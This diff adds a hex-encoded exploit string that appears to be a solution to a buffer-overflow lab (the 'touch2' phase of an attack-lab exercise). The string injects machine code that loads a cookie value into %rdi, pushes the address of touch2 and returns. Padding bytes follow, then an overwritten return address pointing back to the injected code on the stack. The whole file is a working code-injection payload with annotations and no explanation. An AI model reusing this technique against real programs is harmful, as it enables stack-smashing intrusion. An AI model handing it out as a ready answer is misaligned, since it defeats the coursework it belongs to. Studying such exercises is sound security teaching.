@@ -1,0 +1,12 @@
+48 c7 c7 fa 97 b9 59 /* movq $0x59b997fa,%rdi */
+68 ec 17 40 00       /* push $0x4017ec (the address of touch2 is pointed by %rsp) */
+c3                   /* ret */
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00
+78 dc 61 55          /* address of movq */
+
